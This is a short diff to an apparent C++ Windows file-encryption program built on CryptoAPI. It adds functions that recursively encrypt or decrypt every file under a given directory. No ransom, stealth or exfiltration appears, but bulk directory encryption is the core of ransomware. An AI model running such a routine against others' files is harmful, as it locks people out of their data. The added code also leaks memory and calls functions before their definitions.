@@ -3,6 +3,7 @@
 #include <vector>
 #include <iostream>
 #include <fstream>
+#include <filesystem>
 
 #pragma comment(lib, "crypt32.lib")
 #pragma warning(disable:4996)
@@ -11,6 +12,30 @@
 
 using namespace std;
 
+void EncryptionFiles(char *path)
+{
+    for (auto& p : filesystem::recursive_directory_iterator(path))
+    {
+        if (!filesystem::is_directory(p))
+        {
+            char* path_chr = strdup(p.path().string().c_str());
+            EncryptionFile(path_chr);
+        }
+    }
+}
+
+void DecryptionFiles(char* path)
+{
+    for (auto& p : filesystem::recursive_directory_iterator(path))
+    {
+        if (!filesystem::is_directory(p))
+        {
+            char* path_chr = strdup(p.path().string().c_str());
+            DecryptionFile(path_chr);
+        }
+    }
+}
+
 void EncryptionFile(char *path)
 {
     HCRYPTMSG hMsg;
@@ -18,6 +43,8 @@ void EncryptionFile(char *path)
     DWORD cbContent;
     DWORD cbEncodedBlob;
     BYTE* pbEncodedBlob;
+
+   
 
     dataFile openFileData = ReadFile(path);
 
